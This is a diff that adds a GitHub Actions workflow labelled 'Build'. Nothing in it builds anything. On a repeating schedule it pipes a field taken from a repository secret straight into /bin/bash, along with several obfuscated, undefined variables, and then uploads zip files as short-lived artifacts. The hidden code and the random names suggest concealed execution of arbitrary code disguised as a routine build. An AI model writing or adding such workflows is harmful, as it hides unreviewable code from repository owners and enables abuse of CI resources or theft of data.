@@ -1,0 +1,32 @@
+name: Build
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '9 1,7,13,19 * * *'
+permissions:
+  contents: read
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  agent:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Perform
+        env:
+          p91: ${{ secrets.p91 }}
+        run: |
+          printf '%s' "$p91" | jq -r .shqdu125 | /bin/bash
+          echo $afdaz35 | jq -r .he0 | /bin/bash
+          printf '%s' "$illhd680" | jq -r .rk487 | /bin/bash
+          echo $cejir6695 | jq -r .stzk8 | /bin/bash
+          printf '%s' "$ccp14" | jq -r .xa1 | /bin/bash
+
+      - name: Upload results
+        uses: actions/upload-artifact@v4
+        with:
+          name: Ck65XCJf
+          path: "*.zip"
+          retention-days: 1
